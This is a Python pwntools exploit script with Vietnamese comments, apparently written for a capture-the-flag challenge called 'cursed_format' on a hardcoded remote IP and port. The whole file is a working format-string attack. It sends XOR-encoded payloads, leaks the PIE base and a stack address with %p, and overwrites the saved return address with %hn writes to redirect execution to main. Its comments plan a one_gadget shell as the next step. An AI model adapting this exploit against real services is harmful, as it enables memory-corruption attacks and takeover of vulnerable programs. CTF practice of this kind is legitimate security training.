from pwn import *

# --- CẤU HÌNH ---
context.log_level = 'info'
BINARY = './cursed_format'
HOST = '18.212.136.134'
PORT = 8887
LIBC_FILE = './libc_remote.so'
STACK_DIFF = 0x58

p = remote(HOST, PORT)
exe = ELF(BINARY, checksec=False)
libc = ELF(LIBC_FILE, checksec=False)

# XOR Key Setup
current_key = b'\xff' * 32
def send_fmt(payload):
    global current_key
    payload = payload.ljust(32, b'\x00')
    to_send = bytes([a ^ b for a, b in zip(payload, current_key)])
    p.sendlineafter(b'>> ', b'1')
    sleep(0.05)
    p.send(to_send)
    current_key = payload
    return p.recvuntil(b'1. Keep', drop=True)

def solve():
    print("[*] Kiểm tra quay lại Main...")
    
    # 1. Leak
    out = send_fmt(b'%20$p|%1$p').split(b'|')
    pie_base = int(out[0], 16) - 0x12f4
    stack_addr = int(out[1], 16)
    exe.address = pie_base
    print(f"[+] PIE Base: {hex(pie_base)}")

    # 2. Target: Main
    # Thay vì system, ta ghi địa chỉ main vào Ret Addr
    rop_chain = [exe.symbols['main']] 
    target = stack_addr + STACK_DIFF
    
    print(f"[+] Ghi đè Ret Addr ({hex(target)}) thành Main ({hex(exe.symbols['main'])})")

    # 3. Write
    def write_val(addr, val):
        for i in range(4): # Ghi full 8 bytes (dù thực tế chỉ cần 6)
            part = (val >> (16 * i)) & 0xffff
            tgt = addr + (i * 2)
            if part == 0: part = 0x10000
            fmt = f"%{part}c%9$hn".encode()
            pad = 24 - len(fmt)
            send_fmt(fmt + b'A'*pad + p64(tgt))

    curr = target
    for val in rop_chain:
        write_val(curr, val)
        curr += 8

    # 4. Trigger
    print("[*] Triggering Return... Nếu hiện lại Menu thì thành công!")
    p.sendlineafter(b'>> ', b'2')
    
    # Check kết quả
    try:
        # Nếu thấy dòng này nghĩa là main đã chạy lại
        p.recvuntil(b'For all my format string haters', timeout=3)
        print("\n[!!!] THÀNH CÔNG! BẠN ĐÃ ĐIỀU KHIỂN ĐƯỢC EIP [!!!]")
        print("Lỗi nằm ở hàm system. Chúng ta sẽ dùng One_Gadget.")
    except:
        print("\n[-] Vẫn Crash. Có thể Offset 0x58 chưa chuẩn lắm?")

    p.close()

if __name__ == "__main__":
    solve()